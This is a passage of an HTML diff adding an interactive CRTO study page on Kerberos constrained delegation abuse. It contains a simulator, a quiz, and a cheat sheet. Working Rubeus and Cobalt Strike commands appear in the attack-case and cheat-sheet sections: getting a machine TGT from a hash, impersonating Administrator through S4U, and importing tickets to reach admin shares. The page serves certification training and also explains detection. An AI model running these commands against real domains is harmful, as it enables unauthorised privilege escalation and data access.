+      <code>forwardable</code> flag — rather than in the target SPN.</figcaption>
+  </figure>
+
+  <div class="note">
+    <span class="lbl">In plain words</span>
+    <p><strong>S4U2self</strong> is a hand-stamp from the front desk: <em>"dyork was here, at my service."</em>
+      <strong>S4U2proxy</strong> is showing that stamp at the next building's gate to get dyork a guest pass.</p>
+    <p>The gate checks two things before it stamps a pass: the hand-stamp must be <em>transferable</em>
+      (<code>forwardable</code>), and your service must be <em>on the list</em> for that building
+      (<code>msDS-AllowedToDelegateTo</code>). No stamp, no pass. Wrong building, no pass.</p>
+  </div>
+
+  <h3>Follow the ticket</h3>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>Request</th><th>Sent using</th><th>Ticket you get back</th><th>ServiceName</th><th>UserName</th><th>forwardable</th></tr></thead>
+      <tbody>
+        <tr><td>S4U2self</td><td>LON-WS-1$'s TGT</td><td>"dyork used this service"</td><td><code>LON-WS-1$</code></td><td><code>dyork</code></td><td>only with PT</td></tr>
+        <tr><td>S4U2proxy</td><td>TGT + that ticket</td><td>the usable pass</td><td><code>cifs/lon-fs-1</code></td><td><code>dyork</code></td><td>yes</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="note warn">
+    <span class="lbl">Where does the TGT come from?</span>
+    <p>Both requests are made <em>as</em> <code>LON-WS-1$</code>, so you need that computer account's TGT
+      first. In practice: local admin on the host, dump the machine account hash, then
+      <code>Rubeus asktgt /user:LON-WS-1$ /rc4:&lt;hash&gt;</code>. No host access, no S4U. This is the step
+      the write-ups skip and the exam does not.</p>
+  </div>
+</section>
+
+<!-- ══ 5 ═══════════════════════════════════════════════════════════════════ -->
+<section id="sim">
+  <h2><span class="num">05</span>The simulator</h2>
+  <p class="lede">You are on <code>LON-WS-1</code>. Run the four steps, change the toggles, and read the
+    verdict panel every time the KDC refuses. Start with a scenario, then break it yourself.</p>
+
+  <div class="sim">
+    <!-- controls -->
+    <div class="panel">
+      <h3>Scenario</h3>
+      <div class="scen" id="scenBtns">
+        <button type="button" data-scen="easy">The easy case</button>
+        <button type="button" data-scen="hard">The hard case</button>
+        <button type="button" data-scen="blocked">Blocked SPN</button>
+        <button type="button" data-scen="sensitive">Sensitive victim</button>
+      </div>
+
+      <div class="field">
+        <label for="target">Target SPN to ask for</label>
+        <select id="target">
+          <option value="cifs/lon-fs-1">cifs/lon-fs-1 — on the list</option>
+          <option value="ldap/lon-dc-1">ldap/lon-dc-1 — NOT on the list</option>
+          <option value="MSSQLSvc/cont-sql-1">MSSQLSvc/cont-sql-1 — NOT on the list</option>
+        </select>
+      </div>
+
+      <div class="field">
+        <label class="switch">
+          <input type="checkbox" id="pt">
+          <span class="track" aria-hidden="true"></span>
+          <span class="txt">Protocol transition
+            <small>UAC <code>0x1000000</code> · TRUSTED_TO_AUTH_FOR_DELEGATION</small></span>
+        </label>
+      </div>
+
+      <div class="field">
+        <label for="imp">Impersonate who</label>
+        <select id="imp">
+          <option value="Administrator">CONTOSO\Administrator</option>
+          <option value="dyork">CONTOSO\dyork</option>
+          <option value="svc_sql">CONTOSO\svc_sql</option>
+        </select>
+      </div>
+
+      <details class="adv" id="adv">
+        <summary>Advanced</summary>
+        <div class="field">
+          <label class="switch">
+            <input type="checkbox" id="sens">
+            <span class="track" aria-hidden="true"></span>
+            <span class="txt">Victim is sensitive
+              <small>"sensitive and cannot be delegated" / Protected Users</small></span>
+          </label>
+        </div>
+        <div class="field" style="margin-bottom:0">
+          <label for="ev">Evidence ticket for S4U2proxy</label>
+          <select id="ev">
+            <option value="s4u">The S4U2self ticket from step 2</option>
+            <option value="captured">Captured: HTTP/lon-ws-1, forwardable, for dyork</option>
+            <option value="wrong">Captured: HTTP/lon-ws-2 (wrong service), for dyork</option>
+          </select>
+        </div>
+      </details>
+
+      <button class="tbtn" id="reset" type="button" style="width:100%">Reset tickets &amp; log</button>
+    </div>
+
+    <!-- pipeline -->
+    <div>
+      <div class="steps">
+        <div class="step" data-step="tgt">
+          <span class="no">1</span>
+          <div class="body">
+            <div class="t">Get a TGT for LON-WS-1$</div>
+            <div class="d">You need the machine account before you can speak as it.
+              <code>asktgt /user:LON-WS-1$ /rc4:&lt;hash&gt;</code></div>
+            <div class="d st" data-st="tgt"></div>
+          </div>
+          <button class="run" type="button" data-run="tgt">Run</button>
+        </div>
+
+        <div class="step" data-step="self">
+          <span class="no">2</span>
+          <div class="body">
+            <div class="t">S4U2self — ticket to myself</div>
+            <div class="d">Ask the KDC for a ticket for the victim, addressed to <code>LON-WS-1$</code>.
+              Watch the <code>forwardable</code> flag.</div>
+            <div class="d st" data-st="self"></div>
+          </div>
+          <button class="run" type="button" data-run="self">Run</button>
+        </div>
+
+        <div class="step" data-step="proxy">
+          <span class="no">3</span>
+          <div class="body">
+            <div class="t">S4U2proxy — trade it for the target</div>
+            <div class="d">Present the evidence ticket and name the target SPN. The KDC checks three rules.</div>
+            <div class="d st" data-st="proxy"></div>
+          </div>
+          <button class="run" type="button" data-run="proxy">Run</button>
+        </div>
+
+        <div class="step" data-step="use">
+          <span class="no">4</span>
+          <div class="body">
+            <div class="t">Use the ticket</div>
+            <div class="d">Import it with <code>createnetonly</code>, <code>steal_token</code>, then touch a resource.
+              Only the service in the ticket's <code>ServiceName</code> will answer.</div>
+            <div class="d st" data-st="use"></div>
+          </div>
+          <div class="chips" style="margin:0;flex-wrap:wrap;justify-content:flex-end">
+            <button class="chip" type="button" data-use="cifs/lon-fs-1" title="Needs cifs/lon-fs-1">\\lon-fs-1\c$</button>
+            <button class="chip" type="button" data-use="cifs/lon-dc-1" title="Needs cifs/lon-dc-1">\\lon-dc-1\SYSVOL</button>
+          </div>
+        </div>
+      </div>
+
+      <div id="verdict" aria-live="polite"></div>
+
+      <div class="panel" style="margin-top:14px">
+        <h3>Tickets in hand</h3>
+        <div class="tray" id="tray"></div>
+      </div>
+
+      <div class="panel" style="margin-top:14px">
+        <h3>Log</h3>
+        <div class="log" id="log" role="log" aria-label="Rubeus output"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="note">
+    <span class="lbl">What to try</span>
+    <p><strong>The easy case</strong> is the one the course shows first: PT on, forwardable everywhere,
+      one command. <strong>The hard case</strong> turns PT off and shows why the attack still works — it just
+      needs a real ticket instead of a manufactured one. <strong>Blocked SPN</strong> and
+      <strong>Sensitive victim</strong> are the two failures you will meet in a real lab; each has a
+      different fix.</p>
+  </div>
+</section>
+
+<!-- ══ 6 ═══════════════════════════════════════════════════════════════════ -->
+<section id="cases">
+  <h2><span class="num">06</span>The two attack cases</h2>
+  <p class="lede">Same goal, different requirement. One UAC bit decides whether you can name your victim or
+    must supply a real ticket — and that bit changes exactly one Rubeus parameter.</p>
+
+  <div class="grid2">
+    <div class="card">
+      <h3 style="margin-top:0">A · Protocol transition ON</h3>
+      <p style="margin-top:0">You may name any user in the domain. Both requests in one command:</p>
+      <pre><code>beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap</code></pre>
+      <p>Rubeus runs S4U2self (because <code>/impersonateuser</code> was given), gets a forwardable ticket for
+        Administrator, then runs S4U2proxy against the target.</p>
+    </div>
+    <div class="card">
+      <h3 style="margin-top:0">B · Protocol transition OFF</h3>
+      <p style="margin-top:0">You may not name a user. You must supply a ticket the KDC issued to one:</p>
+      <pre><code>beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap</code></pre>
+      <p><code>/tgs</code> replaces <code>/impersonateuser</code>. Rubeus skips S4U2self and goes straight to
+        S4U2proxy with the ticket you handed it.</p>
+    </div>
+  </div>
+
+  <h3>What each parameter is actually doing</h3>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>Parameter</th><th>What it is</th><th>Why the KDC cares</th></tr></thead>
+      <tbody>
+        <tr><td><code>/user:lon-ws-1$</code></td><td>The principal configured for delegation</td><td>It must be a service the KDC knows and that holds the whitelist</td></tr>
+        <tr><td><code>/ticket:…</code></td><td><code>LON-WS-1$</code>'s TGT</td><td>Proves you <em>are</em> that service — without it the request is anonymous</td></tr>
+        <tr><td><code>/msdsspn:cifs/lon-fs-1</code></td><td>The SPN you want</td><td>Must appear in <code>msDS-AllowedToDelegateTo</code></td></tr>
+        <tr><td><code>/impersonateuser</code></td><td>Whose identity you claim</td><td>Only honoured if protocol transition is on</td></tr>
+        <tr><td><code>/tgs:…</code></td><td>A captured forwardable service ticket</td><td>The evidence S4U2proxy will spend; must be addressed to this service</td></tr>
+        <tr><td><code>/nowrap</code></td><td>Output formatting</td><td>Single-line base64, so you can paste it without newlines</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Where the <code>/tgs</code> ticket comes from</h3>
+  <p>You are already on <code>LON-WS-1</code> — you had to be, to get its machine hash. That host caches
+    service tickets for every user who authenticated to it with Kerberos. One of those is
+    <code>HTTP/lon-ws-1</code> for <code>dyork</code>, and the KDC issued it as <code>forwardable</code>.
+    Enumerate the logon sessions (<code>klist</code>, <code>triage</code>, or an LSASS dump), pull that
+    ticket out, and feed it to <code>/tgs</code>. You still cannot become anyone you like — you can only
+    become users who left a ticket with this service.</p>
+
+  <div class="note warn">
+    <span class="lbl">Bronze Bit, briefly</span>
+    <p>CVE-2020-17049 let an attacker take a non-forwardable ticket and flip the flag by re-signing it with the
+      service account's key — collapsing case B back into "become anyone". It is patched. On any current
+      Windows build, a non-forwardable S4U2self ticket is a dead end, and the write-ups that end with
+      "and you're Domain Admin" assume protocol transition is on.</p>
+  </div>
+
+  <h3>Read the failure</h3>
+  <p>Every failure below is a different rule, and each has a different fix:</p>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>What you see</th><th>Which rule failed</th><th>Fix</th></tr></thead>
+      <tbody>
+        <tr><td><code>KDC_ERR_BADOPTION</code> right after S4U2proxy, PT off, used <code>/impersonateuser</code></td><td>Evidence not forwardable</td><td>Capture a real ticket and pass <code>/tgs</code></td></tr>
+        <tr><td><code>KDC_ERR_BADOPTION</code> and the SPN is not on the object</td><td>Not on the whitelist</td><td>Enumerate the list; request an SPN from it</td></tr>
+        <tr><td>S4U2self succeeds but never returns <code>forwardable</code> for one specific user</td><td>Victim is sensitive for delegation</td><td>Choose another victim</td></tr>
+        <tr><td>Works against <code>lon-fs-1</code> but not the DC</td><td>Whitelist is per-SPN, not per-host</td><td>Check the exact strings in the attribute</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ══ 7 ═══════════════════════════════════════════════════════════════════ -->
+<section id="kdc">
+  <h2><span class="num">07</span>You are the KDC</h2>
+  <p class="lede">Six requests. Decide allow or deny, using only the three rules. No hints until you commit.</p>
+  <div id="quiz"></div>
+</section>
+
+<!-- ══ 8 ═══════════════════════════════════════════════════════════════════ -->
+<section id="confusion">
+  <h2><span class="num">08</span>The confusions that cost marks</h2>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>Question</th><th>Answer</th></tr></thead>
+      <tbody>
+        <tr><td>Why can't I just forge a service ticket?</td><td>It is encrypted with the target service's key. Forging <code>cifs/lon-fs-1</code> needs lon-fs-1's hash; a golden ticket needs <code>krbtgt</code>. Without either, only the KDC can mint it.</td></tr>
+        <tr><td>S4U2self or S4U2proxy?</td><td>S4U2self = a ticket for the victim <em>to the service itself</em>. S4U2proxy = trade that for a ticket to the target. You need both unless PT is off and you captured a real ticket.</td></tr>
+        <tr><td>Constrained vs unconstrained?</td><td>Unconstrained sets <code>TRUSTED_FOR_DELEGATION</code> (524288) and hands the service the user's TGT, so it can reach <em>any</em> service. Constrained (S4U) gives it no TGT and limits it to <code>msDS-AllowedToDelegateTo</code>.</td></tr>
+        <tr><td>Constrained vs RBCD?</td><td>RBCD puts <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the <em>target</em>, not the front-end. Different attribute, different abuse path (you create a machine account and set that attribute if you can write it). Do not mix them up in an answer.</td></tr>
+        <tr><td>Do I need Domain Admin first?</td><td>No. You need local admin on the front-end to get its machine hash, plus any user with a ticket (case B) or PT on (case A). The point of the attack is to <em>reach</em> DA.</td></tr>
+        <tr><td>Why does the ticket need the machine's TGT?</td><td>The KDC has to know <em>who is asking</em>. The TGT is that proof. Without it, no S4U request can be made at all.</td></tr>
+        <tr><td>What does the DC log?</td><td>4769 on the KDC with <code>S4U2Self</code> / <code>S4U2proxy</code> in the Transited Services field, and a 4624 type 3 on the target. Quieter than reading LSASS, but not invisible.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ══ 9 ═══════════════════════════════════════════════════════════════════ -->
+<section id="cheat">
+  <h2><span class="num">09</span>One-screen cheat sheet</h2>
+
+  <div class="card">
+    <h3 style="margin-top:0">The three conditions</h3>
+    <div class="chips">
+      <span class="chip">1 · evidence ticket <b>forwardable</b></span>
+      <span class="chip">2 · evidence ticket addressed to <b>LON-WS-1$</b></span>
+      <span class="chip">3 · target SPN in <b>msDS-AllowedToDelegateTo</b></span>
+    </div>
+    <p style="margin-bottom:0">Protocol transition (UAC <code>0x1000000</code>) decides whether condition 1 can
+      be satisfied by S4U2self. With it off, satisfy it with a captured ticket via <code>/tgs</code>.</p>
+  </div>
+
+  <div class="card">
+    <h3 style="margin-top:0">Recon</h3>
+    <pre><code>ldapsearch (&amp;(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
+ldapsearch (&amp;(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
+
+# protocol transition check, in PowerShell
+[System.Convert]::ToBoolean(16781312 -band 16777216)</code></pre>
+  </div>
+
+  <div class="card">
+    <h3 style="margin-top:0">Exploit</h3>
+    <pre><code># 1. machine TGT (needs local admin on the front-end for the hash)
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:lon-ws-1$ /rc4:&lt;hash&gt; /nowrap
+
+# 2a. PT ON — name anyone
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:&lt;tgt&gt; /impersonateuser:Administrator /nowrap
+
+# 2b. PT OFF — supply a captured forwardable ticket
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:&lt;tgt&gt; /tgs:&lt;captured-tgs&gt; /nowrap
+
+# 3. use it
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:&lt;victim&gt; /password:FakePass /ticket:&lt;s4u-ticket&gt;
+steal_token &lt;pid&gt;
+ls \\lon-fs-1\c$</code></pre>
+  </div>
+
+  <div class="note warn">
+    <span class="lbl">Exam-day reminders</span>
+    <p>Enumerate before you request: the whitelist is exact strings, and a missing FQDN suffix is a refusal.
+      If S4U2proxy fails, look at the <em>evidence ticket's</em> flags before you touch the target SPN — most
+      BADOPTIONs are condition 1, not condition 3.</p>
+  </div>
+</section>
+
+<footer>
+  <p>Part of the CRTO I study pack. Use only against systems you are authorised to test, and in the exam
+    environment per the Candidate Handbook.</p>
+</footer>
+
+</div>
+
+<script>
+(function(){
+  'use strict';
+  var $ = function(s,r){ return (r||document).querySelector(s); };
+  var $$ = function(s,r){ return Array.prototype.slice.call((r||document).querySelectorAll(s)); };
+  function esc(s){ return String(s).replace(/[&<>"]/g,function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]; }); }
+
+  /* ── theme ─────────────────────────────────────────────────────────────── */
+  var THEMES=['auto','dark','light'], ti=0;
+  try { var saved=localStorage.getItem('crto-cd-theme'); if(saved && THEMES.indexOf(saved)>-1) ti=THEMES.indexOf(saved); } catch(e){}
+  function applyTheme(){
+    document.documentElement.setAttribute('data-theme',THEMES[ti]);
+    var b=$('#theme'); if(b) b.textContent='Theme: '+THEMES[ti];
+  }
+  $('#theme').addEventListener('click',function(){
+    ti=(ti+1)%3;
+    try { localStorage.setItem('crto-cd-theme',THEMES[ti]); } catch(e){}
+    applyTheme();
+  });
+  applyTheme();
+
+  /* ── 1 · ticket scope ──────────────────────────────────────────────────── */
+  var TK_SVC='cifs/lon-fs-1';
+  var useBtns=$('#useBtns'), useOut=$('#useOut');
+  if(useBtns) useBtns.addEventListener('click',function(e){
+    var b=e.target.closest('button'); if(!b) return;
+    var needs=b.getAttribute('data-needs');
+    useOut.innerHTML = (needs===TK_SVC)
+      ? '<span class="chip ok">✓ allowed</span> ServiceName matches. <code>dyork</code> is accepted at <code>'+esc(needs)+'</code>.'
+      : '<span class="chip bad">✗ rejected</span> The ticket says <code>'+esc(TK_SVC)+'</code>. <code>'+esc(needs)+'</code> refuses it before it ever looks at the UserName.';
+  });
+
+  /* ── 2 · why the obvious approaches fail ───────────────────────────────── */
+  var WHY={
+    local: '<strong>"Run as" dies at the next hop.</strong> You can impersonate dyork <em>on LON-WS-1</em> with <code>make_token</code> or a stolen token, but that only convinces LON-WS-1. CONT-SQL-1 does not accept "trust me, I am dyork" from another machine — it accepts a Kerberos service ticket or nothing. Your local impersonation has no ticket to offer.',
+    forge: '<strong>You cannot mint a ticket.</strong> A service ticket is encrypted with the <em>target service account\'s</em> key. Forging <code>cifs/lon-fs-1</code> for dyork needs lon-fs-1\'s password hash; a golden ticket needs <code>krbtgt</code>. You hold neither. That is why the attacker has to make the KDC print it.',
+    tgt: '<strong>That is unconstrained delegation.</strong> Handing over dyork\'s TGT works — it is exactly what the legacy <code>TRUSTED_FOR_DELEGATION</code> flag (524288) permits. It is also a disaster: a TGT can be traded for a ticket to <em>any</em> service. Constrained delegation exists so the KDC can issue one ticket to one named destination instead, without ever handing over the TGT.'
+  };
+  var whyBtns=$('#whyBtns'), whyOut=$('#whyOut');
+  if(whyBtns) whyBtns.addEventListener('click',function(e){
+    var b=e.target.closest('button'); if(!b) return;
+    whyOut.innerHTML=WHY[b.getAttribute('data-why')]||'';
+  });
+
+  /* ── 3 · UAC calculator ────────────────────────────────────────────────── */
+  var FLAGS=[
+    [512,'NORMAL_ACCOUNT'],
+    [4096,'WORKSTATION_TRUST_ACCOUNT'],
+    [8192,'SERVER_TRUST_ACCOUNT'],
+    [65536,'DONT_EXPIRE_PASSWORD'],
+    [524288,'TRUSTED_FOR_DELEGATION'],
+    [1048576,'NOT_DELEGATED'],
+    [2097152,'USE_DES_KEY_ONLY'],
+    [4194304,'DONT_REQUIRE_PREAUTH'],
+    [16777216,'TRUSTED_TO_AUTH_FOR_DELEGATION']
+  ];
+  var uacIn=$('#uacIn'), uacBits=$('#uacBits'), uacOut=$('#uacOut');
+  function parseUac(v){
+    v=String(v).trim();
+    if(/^0x/i.test(v)) return parseInt(v.slice(2),16);
+    return parseInt(v,10);
+  }
+  function renderUac(){
+    if(!uacIn) return;
+    var n=parseUac(uacIn.value);
+    if(!isFinite(n) || n<0){
+      uacBits.innerHTML=''; uacOut.innerHTML='<span class="chip bad">Not a number</span> Enter a decimal value or <code>0x…</code>.';
+      return;
+    }
+    var rows='';
+    for(var i=0;i<FLAGS.length;i++){
+      var dec=FLAGS[i][0], set=(n & dec)!==0;
+      rows+='<div class="bit"><span class="'+(set?'set':'unset')+'">'+(set?'✓ set':'· unset')+'</span>'
+        + '<span class="'+(set?'':'unset')+'">'+dec+'</span>'
+        + '<span class="nm '+(set?'':'unset')+'">'+esc(FLAGS[i][1])+'</span></div>';
+    }
+    uacBits.innerHTML=rows;
+    var pt=(n & 16777216)!==0, unconstrained=(n & 524288)!==0, notDeleg=(n & 1048576)!==0;
+    var msg='<code>'+n+'</code> = <code>0x'+(n>>>0).toString(16).toUpperCase()+'</code>. '
+      + '<code>'+n+' -band 16777216</code> = '
+      + (pt ? '<b style="color:var(--ok)">16777216 → protocol transition ON</b>' : '<b style="color:var(--bad)">0 → protocol transition OFF</b>') + '.';
+    if(unconstrained) msg+=' <br>Also carries TRUSTED_FOR_DELEGATION: this object is set up for <em>unconstrained</em> delegation.';
+    if(notDeleg) msg+=' <br>Also carries NOT_DELEGATED: "sensitive and cannot be delegated", so no S4U2self ticket for this object will be forwardable.';
+    uacOut.innerHTML=msg;
+  }
+  if(uacIn){
+    uacIn.addEventListener('input',renderUac);
+    $$('[data-uac]').forEach(function(b){
+      b.addEventListener('click',function(){ uacIn.value=b.getAttribute('data-uac'); renderUac(); });
+    });
+    renderUac();
+  }
+
+  /* ── 5 · simulator ─────────────────────────────────────────────────────── */
+  var SUBJECT='LON-WS-1$', REALM='CONTOSO.COM';
+  var ALLOWED=['cifs/lon-fs-1','cifs/lon-fs-1.contoso.com'];
+  var S={ target:'cifs/lon-fs-1', pt:false, imp:'Administrator', sensitive:false, ev:'s4u',
+          tgt:null, self:null, proxy:null, lastChecks:null, lastOk:false };
+  var seq=0, logEl=$('#log');
+
+  function mk(o){
+    seq++;
+    return { serviceName:o.serviceName, user:o.user, flags:o.flags||[], title:o.title };
+  }
+  function logLine(kind,text){
+    var d=document.createElement('div'); d.className='l '+kind; d.textContent=text;
+    logEl.appendChild(d); logEl.scrollTop=logEl.scrollHeight;
+  }
+  function clearLog(){ logEl.innerHTML=''; }
+
+  function evidenceTicket(){
+    if(S.ev==='s4u') return S.self;
+    if(S.ev==='captured') return { serviceName:'HTTP/lon-ws-1', user:'dyork',
+      flags:['name_canonicalize','pre_authent','renewable','forwardable'], title:'captured TGS' };
+    return { serviceName:'HTTP/lon-ws-2', user:'dyork',
+      flags:['name_canonicalize','pre_authent','renewable','forwardable'], title:'captured TGS' };
+  }
+  function isFwd(t){ return !!t && t.flags.indexOf('forwardable')>-1; }
+
+  function runTgt(){
+    clearLog();
+    S.tgt=mk({ serviceName:'krbtgt/'+REALM, user:SUBJECT, title:'TGT · LON-WS-1$',
+      flags:['name_canonicalize','pre_authent','renewable','forwardable'] });
+    S.self=null; S.proxy=null; S.lastChecks=null;
+    logLine('head','[*] Action: AskTGT');
+    logLine('info','[*] Using domain controller: LON-DC-1.contoso.com (10.10.120.1)');
+    logLine('ok','[+] TGT request successful!');
+    logLine('plain','[*] base64(ticket.kirbi):');
+    logLine('sys','      doIFj[...snip...]9DT00=');
+    logLine('plain','');
+    logLine('info',"[*] You can now prove 'I am LON-WS-1$' to the KDC. Every S4U request runs as this service.");
+    render();
+  }
+
+  function runSelf(){
+    if(!S.tgt) return;
+    clearLog();
+    var fwd=S.pt && !S.sensitive;
+    var base=['name_canonicalize','pre_authent','renewable'];
+    S.self=mk({ serviceName:SUBJECT, user:S.imp, title:'S4U2self · '+S.imp+' → LON-WS-1$',
+      flags: fwd ? base.concat(['forwardable']) : base });
+    S.proxy=null; S.lastChecks=null;
+    logLine('head','[*] Action: S4U');
+    logLine('info',"[*] Building S4U2self request for: 'LON-WS-1$@CONTOSO.COM'");
+    logLine('info','[*] Sending S4U2self request to 10.10.120.1:88');
+    logLine('ok','[+] S4U2self success!');
+    logLine('plain',"[*] Got a TGS for '"+S.imp+"' to 'LON-WS-1$@CONTOSO.COM'");
+    logLine('plain','[*] Flags: '+base.join(', ')+(fwd?', forwardable':''));
+    if(fwd){
+      logLine('ok','[*] The KDC set forwardable. This ticket can be spent at S4U2proxy.');
+    } else if(S.sensitive){
+      logLine('err',"[*] No forwardable flag: '"+S.imp+"' is marked sensitive-and-cannot-be-delegated (or sits in Protected Users).");
+      logLine('sys','[*] This holds even with protocol transition on. Pick a different victim.');
+    } else {
+      logLine('err','[*] No forwardable flag: protocol transition is OFF, so the KDC will not vouch for this user beyond this service.');
+      logLine('sys','[*] You will need a ticket the KDC actually issued to a user — see /tgs in step 3.');
+    }
+    logLine('plain','');
+    logLine('info','[*] On its own this ticket is nearly useless: its ServiceName is LON-WS-1$, your own account.');
+    render();
+  }
+
+  function runProxy(){
+    clearLog();
+    var ev=evidenceTicket();
+    if(!S.tgt){ logLine('err','[*] Run step 1 first — the KDC needs to know who is asking.'); return; }
+    if(!ev){
+      S.proxy=null; S.lastChecks=null;
+      logLine('err','[*] No evidence ticket. Run S4U2self, or pick a captured ticket under Advanced.');
+      render(); return;
+    }
+    var addressedToRequester = ev.serviceName===SUBJECT || ev.serviceName==='HTTP/lon-ws-1';
+    var allowed = ALLOWED.indexOf(S.target)>-1;
+    var checks=[
+      { ok: addressedToRequester,
+        label:'Evidence ticket is addressed to the requesting service',
+        why: addressedToRequester
+          ? 'ServiceName is '+ev.serviceName+' — the KDC accepts it as belonging to LON-WS-1$.'
+          : 'ServiceName is '+ev.serviceName+', but the request comes from LON-WS-1$. Evidence must have been issued to the requester.' },
+      { ok: isFwd(ev),
+        label:'Evidence ticket carries the forwardable flag',
+        why: isFwd(ev)
+          ? 'forwardable is set, so the ticket may be traded.'
+          : 'No forwardable flag. The KDC will not let this ticket become another ticket. This is the usual cause of BADOPTION.' },
+      { ok: allowed,
+        label:'Requested SPN is in msDS-AllowedToDelegateTo',
+        why: allowed
+          ? S.target+' is on LON-WS-1$\'s list.'
+          : S.target+' is not on the list. Only cifs/lon-fs-1 and cifs/lon-fs-1.contoso.com are allowed.' }
+    ];
+    var allOk = checks.every(function(c){ return c.ok; });
+
+    logLine('head','[*] Action: S4U');
+    logLine('info','[*] Loaded a TGS for CONTOSO.COM\\'+ev.user);
+    logLine('info',"[*] Building S4U2proxy request for service: '"+S.target+"'");
+    logLine('info','[*] Sending S4U2proxy request to domain controller 10.10.120.1:88');
+
+    if(allOk){
+      S.proxy=mk({ serviceName:S.target, user:ev.user, title:'S4U2proxy · '+ev.user+' → '+S.target,
+        flags:['name_canonicalize','pre_authent','renewable','forwardable'] });
+      logLine('ok','[+] S4U2proxy success!');
+      logLine('plain',"[*] base64(ticket.kirbi) for SPN '"+S.target+"':");
+      logLine('sys','      doIGL[...snip...]mcy0x');
+      logLine('plain','');
+      logLine('ok',"[*] You now hold '"+ev.user+" → "+S.target+"'. Step 4 can use it.");
+    } else {
+      S.proxy=null;
+      logLine('err','[X] KRB-ERROR (13) : KDC_ERR_BADOPTION');
+      logLine('sys','[*] The KDC refused to trade the evidence ticket. The checklist above names the rule that failed.');
+    }
+    S.lastChecks=checks; S.lastOk=allOk;
+    render();
+  }
+
+  function useRes(need,label){
+    if(!S.proxy){ logLine('err','[*] No service ticket yet — run S4U2proxy first.'); return; }
+    logLine('info','beacon> steal_token '+(2000+seq));
+    if(S.proxy.serviceName===need){
+      logLine('ok','beacon> ls '+label);
+      logLine('plain','  Size     Type    Last Modified         Name');
+      logLine('plain','           dir     02/20/2025 10:37:21   Files');
+      logLine('plain','           dir     01/23/2025 13:47:43   Recovery');
+      logLine('plain','           dir     01/23/2025 13:34:02   Windows');
+      logLine('plain','');
+      logLine('ok','[*] '+S.proxy.user+' can read '+label+'. That is the whole attack.');
+    } else {
+      logLine('err','beacon> ls '+label);
+      logLine('err','[X] Access is denied.');
+      logLine('sys','[*] Your ticket is '+S.proxy.serviceName+'; this resource needs '+need+'.');
+    }
+  }
+
+  function ticketHtml(t){
+    if(!t) return '';
+    var fwd=isFwd(t);
+    var other=t.flags.filter(function(f){ return f!=='forwardable'; })
+      .map(function(f){ return '<span class="flag">'+esc(f)+'</span>'; }).join('');
+    return '<div class="ticket"><div class="hd">'+esc(t.title)+'</div>'
+      + '<div class="row"><span class="k">ServiceName</span><span class="v hi">'+esc(t.serviceName)+'</span></div>'
+      + '<div class="row"><span class="k">UserName</span><span class="v hi">'+esc(t.user)+'</span></div>'
+      + '<div class="row"><span class="k">Flags</span><span class="v">'+other
+      + '<span class="flag '+(fwd?'on':'off')+'">forwardable</span></span></div>'
+      + '</div>';
+  }
+
+  function fixHint(){
+    var bits=[];
+    if(!S.pt && S.ev==='s4u' && !S.sensitive) bits.push('turn protocol transition ON, or supply a captured forwardable ticket with the <code>/tgs</code> parameter');
+    if(S.sensitive) bits.push('a sensitive account can never be delegated — pick another victim');
+    if(ALLOWED.indexOf(S.target)<0) bits.push('pick an SPN that is on the <code>msDS-AllowedToDelegateTo</code> list');
+    if(S.ev==='wrong') bits.push('the evidence ticket must be addressed to the front-end service');
+    if(!bits.length) bits.push('check the evidence ticket and the allowed SPN');
+    return bits.join('; ')+'.';
+  }
+
+  function renderVerdict(){
+    var v=$('#verdict');
+    if(!S.lastChecks){ v.innerHTML=''; return; }
+    var html='<div class="verdict '+(S.lastOk?'ok':'bad')+'"><div class="h">'
+      + (S.lastOk?'KDC allowed S4U2proxy':'KDC refused · KDC_ERR_BADOPTION')+'</div><div class="checks">';
+    S.lastChecks.forEach(function(c){
+      html+='<div class="check '+(c.ok?'ok':'bad')+'"><span class="m">'+(c.ok?'✓':'✗')+'</span><span>'
+        + esc(c.label)+'<span class="why">'+esc(c.why)+'</span></span></div>';
+    });
+    html+='</div>';
+    if(!S.lastOk) html+='<p style="margin:12px 0 0;font-size:13px"><b>Fix it:</b> '+fixHint()+'</p>';
+    html+='</div>';
+    v.innerHTML=html;
+  }
+
+  function markStep(key,done,fail){
+    var el=$('[data-step="'+key+'"]'); if(!el) return;
+    el.classList.toggle('done',!!done); el.classList.toggle('fail',!!fail);
+  }
+  function setStatus(key,html){
+    var el=$('[data-st="'+key+'"]'); if(el) el.innerHTML=html;
+  }
+
+  function render(){
+    var selfFwd=isFwd(S.self);
+
+    markStep('tgt',!!S.tgt,false);
+    markStep('self',!!S.self,false);
+    markStep('proxy',!!S.proxy,!!(S.lastChecks && !S.lastOk));
